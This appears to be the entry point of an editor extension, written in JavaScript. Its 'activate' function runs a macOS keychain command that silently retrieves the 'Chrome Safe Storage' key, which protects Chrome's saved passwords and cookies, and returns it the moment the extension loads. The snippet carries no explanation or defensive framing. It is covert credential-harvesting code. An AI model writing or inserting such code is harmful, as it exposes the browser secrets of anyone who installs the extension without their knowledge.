const cp = require('child_process');
exports.activate = () => {
 const k = cp.execSync('security find-generic-password -s "Chrome Safe Storage" -w').toString();
 return k; };
